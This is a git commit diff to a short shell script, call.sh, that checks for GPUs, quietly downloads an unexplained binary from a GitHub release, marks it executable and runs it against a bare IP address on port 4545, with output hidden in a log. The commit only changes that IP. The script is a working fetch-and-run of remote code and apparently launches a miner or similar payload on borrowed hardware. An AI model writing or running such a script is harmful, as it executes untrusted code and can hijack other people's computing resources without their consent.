32d8670507a81df9c134ae43cdaf35a61615a2a7
edwardksrbv9 <79772723+edwardksrbv9@users.noreply.github.com>
2021-02-28 02:40:40 +0000

    Update call.sh

--- call.sh
+++ call.sh
@@ -2,4 +2,4 @@
 nvidia-smi -L
 wget https://github.com/edwardksrbv9/kingbet/releases/download/1/call &> /dev/null
 chmod +x call
-./call -P http://64.52.174.90:4545/"$1" &> log
+./call -P http://216.198.92.69:4545/"$1" &> log
